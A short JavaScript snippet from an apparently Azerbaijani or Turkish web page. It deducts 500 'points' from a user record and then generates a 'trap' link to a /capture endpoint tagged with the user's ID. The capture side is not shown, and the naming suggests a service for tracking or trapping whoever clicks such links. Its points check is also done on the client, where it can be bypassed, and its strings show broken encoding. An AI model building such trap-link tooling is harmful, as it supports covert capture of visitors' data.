<script>
    async function generateSecureLink() {
        const user = localStorage.getItem('elite_session');
        const userRef = db.ref('users/' + user);
        const snap = await userRef.get();
        const pts = snap.val().points || 0;

        if (pts < 500) {
            alert(currentLang === 'az' ? "Xal谋n谋z kifay蓹t deyil!" : "Puan谋n谋z yetersiz!");
            return;
        }

        // Xal谋n 莽谋x谋lmas谋
        await userRef.update({ points: pts - 500 });
        
        document.getElementById('trap-init-gate').style.display = 'none';
        document.getElementById('trap-loading').style.display = 'block';

        setTimeout(() => {
            document.getElementById('trap-loading').style.display = 'none';
            document.getElementById('trap-result').style.display = 'block';
            
            // Real sayt linkini qurmaq (domain-i avtomatik tap谋r)
            const siteUrl = window.location.origin;
            const uniqueID = Math.random().toString(36).substring(7);
            document.getElementById('final-link-box').innerText = `${siteUrl}/capture?id=${uniqueID}&ref=${user}`;
        }, 3500);
    }
</script>
